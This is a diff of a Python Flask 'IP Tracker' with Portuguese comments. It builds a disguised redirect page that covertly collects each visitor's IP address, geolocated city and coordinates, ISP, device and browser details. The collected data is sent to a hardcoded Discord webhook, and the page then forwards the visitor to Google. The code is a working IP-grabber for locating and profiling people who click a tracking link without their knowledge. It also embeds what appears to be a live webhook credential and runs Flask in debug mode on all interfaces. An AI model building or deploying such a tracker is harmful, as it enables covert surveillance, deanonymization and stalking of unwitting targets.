@@ -6,7 +6,41 @@ from user_agents import parse
 
 app = Flask(__name__)
 
-# Página que o usuário acessa (link encurtado/tracker)
+# ============================================
+# CONFIGURAÇÃO - SUBSTITUA PELA SUA WEBHOOK
+# ============================================
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1552138403146104924/OQzg_EJuS1Qi7_6W111uFOkG9BdI6i1dbfY-UTkfT5SvZag8vnRcpX7xp_GWCxhDhV_f"
+
+# ============================================
+# FUNÇÃO PARA ENVIAR WEBHOOK
+# ============================================
+def send_discord_embed(title, color, fields, timestamp=None):
+    """Envia embed formatado para o Discord"""
+    try:
+        embed = {
+            "title": title,
+            "color": color,
+            "fields": fields,
+            "footer": {"text": "IP Tracker Bot"},
+            "timestamp": timestamp or datetime.datetime.utcnow().isoformat()
+        }
+        
+        payload = {
+            "username": "🎯 IP Tracker",
+            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2098/2098402.png",
+            "embeds": [embed]
+        }
+        
+        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
+        return response.status_code == 204
+        
+    except Exception as e:
+        print(f"[ERRO Webhook] {e}")
+        return False
+
+# ============================================
+# ROTA PRINCIPAL - PÁGINA DE TRACKING
+# ============================================
 @app.route('/')
 def tracker():
     # Coleta dados do servidor
@@ -19,16 +53,15 @@ def tracker():
         'accept_encoding': request.headers.get('Accept-Encoding'),
         'connection': request.headers.get('Connection'),
         'host': request.headers.get('Host'),
-        'headers': dict(request.headers),
     }
     
     # Parse do User-Agent
     ua = parse(request.headers.get('User-Agent', ''))
     data['device'] = {
         'browser': ua.browser.family,
-        'browser_version': str(ua.browser.version),
+        'browser_version': '.'.join([str(v) for v in ua.browser.version]) if ua.browser.version else 'N/A',
         'os': ua.os.family,
-        'os_version': str(ua.os.version),
+        'os_version': '.'.join([str(v) for v in ua.os.version]) if ua.os.version else 'N/A',
         'device': ua.device.family,
         'is_mobile': ua.is_mobile,
         'is_tablet': ua.is_tablet,
@@ -36,104 +69,165 @@ def tracker():
         'is_bot': ua.is_bot
     }
     
-    # Geolocalização via IP (API gratuita)
+    # Geolocalização via IP
     try:
         ip = data['ip_address'].split(',')[0].strip()
-        if ip != '127.0.0.1':
+        if ip and ip != '127.0.0.1':
             geo_response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
             if geo_response.status_code == 200:
-                geo_data = geo_response.json()
-                data['geolocation'] = {
-                    'country': geo_data.get('country'),
-                    'country_code': geo_data.get('countryCode'),
-                    'region': geo_data.get('regionName'),
-                    'city': geo_data.get('city'),
-                    'zip': geo_data.get('zip'),
-                    'lat': geo_data.get('lat'),
-                    'lon': geo_data.get('lon'),
-                    'timezone': geo_data.get('timezone'),
-                    'isp': geo_data.get('isp'),
-                    'org': geo_data.get('org'),
-                    'as': geo_data.get('as')
-                }
+                geo = geo_response.json()
+                if geo.get('status') == 'success':
+                    data['geolocation'] = {
+                        'country': geo.get('country'),
+                        'country_code': geo.get('countryCode'),
+                        'region': geo.get('regionName'),
+                        'city': geo.get('city'),
+                        'zip': geo.get('zip'),
+                        'lat': geo.get('lat'),
+                        'lon': geo.get('lon'),
+                        'timezone': geo.get('timezone'),
+                        'isp': geo.get('isp'),
+                        'org': geo.get('org'),
+                        'as': geo.get('as')
+                    }
     except Exception as e:
         data['geolocation_error'] = str(e)
     
-    # Salva em arquivo
-    with open('clicks_data.jsonl', 'a', encoding='utf-8') as f:
-        f.write(json.dumps(data, ensure_ascii=False) + '\n')
+    # Salva em arquivo local
+    try:
+        with open('clicks_data.jsonl', 'a', encoding='utf-8') as f:
+            f.write(json.dumps(data, ensure_ascii=False) + '\n')
+    except:
+        pass
     
-    # HTML com JavaScript para coletar mais dados do cliente
+    # ===== ENVIAR PARA DISCORD =====
+    geo = data.get('geolocation', {})
+    device = data.get('device', {})
+    
+    fields = [
+        {"name": "🌐 IP Address", "value": f"`{data.get('ip_address', 'N/A')}`", "inline": True},
+        {"name": "📍 Localização", "value": f"{geo.get('city', 'N/A')}, {geo.get('region', 'N/A')}\n{geo.get('country', 'N/A')}", "inline": True},
+        {"name": "🌎 Coordenadas", "value": f"Lat: `{geo.get('lat', 'N/A')}`\nLon: `{geo.get('lon', 'N/A')}`", "inline": True},
+        {"name": "💻 Sistema", "value": f"**OS:** {device.get('os', 'N/A')} {device.get('os_version', '')}\n**Browser:** {device.get('browser', 'N/A')}", "inline": False},
+        {"name": "📱 Dispositivo", "value": f"{device.get('device', 'N/A')}\nMobile: {'✅' if device.get('is_mobile') else '❌'} | PC: {'✅' if device.get('is_pc') else '❌'}", "inline": True},
+        {"name": "🔗 ISP", "value": f"{geo.get('isp', 'N/A')[:50]}", "inline": True},
+        {"name": "📨 Origem", "value": f"{data.get('referrer', 'Direto')[:50] if data.get('referrer') else 'Direto'}", "inline": False},
+    ]
+    
+    send_discord_embed("🎯 Novo Acesso Detectado", 0x00ff00, fields, data['timestamp'])
+    
+    # HTML com JavaScript para coletar dados do cliente
     html = '''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Carregando...</title>
+        <title>Redirecionando...</title>
+        <style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;color:#666}</style>
         <script>
-            // Coleta informações do navegador/dispositivo
             const clientData = {
                 screen: {
                     width: screen.width,
                     height: screen.height,
                     availWidth: screen.availWidth,
                     availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
+                    colorDepth: screen.colorDepth
                 },
                 window: {
                     innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
+                    innerHeight: window.innerHeight
                 },
                 navigator: {
                     language: navigator.language,
-                    languages: navigator.languages,
                     platform: navigator.platform,
                     cookieEnabled: navigator.cookieEnabled,
                     onLine: navigator.onLine,
                     hardwareConcurrency: navigator.hardwareConcurrency,
-                    maxTouchPoints: navigator.maxTouchPoints,
                     deviceMemory: navigator.deviceMemory || 'unknown',
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : null
+                    maxTouchPoints: navigator.maxTouchPoints
                 },
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timezoneOffset: new Date().getTimezoneOffset(),
-                localTime: new Date().toString(),
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                pdfViewerEnabled: navigator.pdfViewerEnabled,
-                webdriver: navigator.webdriver,
-                doNotTrack: navigator.doNotTrack,
-                touchSupport: 'ontouchstart' in window,
-                canvas_fingerprint: (function() {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        const ctx = canvas.getContext('2d');
-                        ctx.textBaseline = 'top';
-                        ctx.font = '14px Arial';
-                        ctx.fillText('Fingerprint', 2, 2);
-                        return canvas.toDataURL('image/png').slice(-50);
-                    } catch(e) {
-                        return null;
-                    }
-                })()
+                touch: 'ontouchstart' in window,
+                pdf: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver
             };
             
-            // Envia dados para o servidor
             fetch('/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(clientData)
-            }).then(() => {
-                // Redireciona após coleta (opcional)
+            }).finally(() => {
                 window.location.href = 'https://www.google.com';
             });
         </script>
     </head>
     <body>
-        <p>Carregando...</p>
+        <h2>⏳ Redirecionando...</h2>
+        <p>Por favor, aguarde um momento.</p>
     </body>
+    </html>
+    '''
+    
+    return render_template_string(html)
+
+# ============================================
+# ROTA PARA RECEBER DADOS DO JAVASCRIPT
+# ============================================
+@app.route('/collect', methods=['POST'])
+def collect():
+    try:
+        client_data = request.get_json() or {}
+        
+        # Salva dados do cliente
+        full_data = {
+            'timestamp': datetime.datetime.now().isoformat(),
+            'ip': request.remote_addr,
+            'client': client_data
+        }
+        
+        with open('clicks_data.jsonl', 'a', encoding='utf-8') as f:
+            f.write(json.dumps(full_data, ensure_ascii=False) + '\n')
+        
+        # Envia dados do cliente para Discord
+        nav = client_data.get('navigator', {})
+        screen = client_data.get('screen', {})
+        
+        fields = [
+            {"name": "🖥️ Resolução", "value": f"{screen.get('width')}x{screen.get('height')}", "inline": True},
+            {"name": "📐 Viewport", "value": f"{client_data.get('window', {}).get('innerWidth')}x{client_data.get('window', {}).get('innerHeight')}", "inline": True},
+            {"name": "🌐 Idioma", "value": f"{nav.get('language', 'N/A')}", "inline": True},
+            {"name": "⚡ Hardware", "value": f"Cores: {nav.get('hardwareConcurrency', 'N/A')}\nRAM: {nav.get('deviceMemory', 'N/A')}GB", "inline": True},
+            {"name": "🖱️ Touch", "value": f"{'Sim' if client_data.get('touch') else 'Não'}", "inline": True},
+            {"name": "🕐 Timezone", "value": f"{client_data.get('timezone', 'N/A')}", "inline": True},
+        ]
+        
+        send_discord_embed("💻 Dados do Navegador", 0x3498db, fields)
+        
+    except Exception as e:
+        print(f"[ERRO Collect] {e}")
+    
+    return jsonify({"status": "ok"})
+
+# ============================================
+# ROTA PARA VER LOGS (opcional)
+# ============================================
+@app.route('/logs')
+def view_logs():
+    try:
+        with open('clicks_data.jsonl', 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+            logs = [json.loads(line) for line in lines[-20:]]  # últimos 20
+        return jsonify(logs)
+    except:
+        return jsonify([])
+
+# ============================================
+# INICIAR SERVIDOR
+# ============================================
+if __name__ == '__main__':
+    print("=" * 50)
+    print("🎯 IP Tracker iniciado!")
+    print(f"📡 Webhook: {'Configurado' if DISCORD_WEBHOOK else 'NÃO CONFIGURADO'}")
+    print("🔗 Acesse: http://localhost:5000")
+    print("=" * 50)
+    app.run(debug=True, host='0.0.0.0', port=5000)
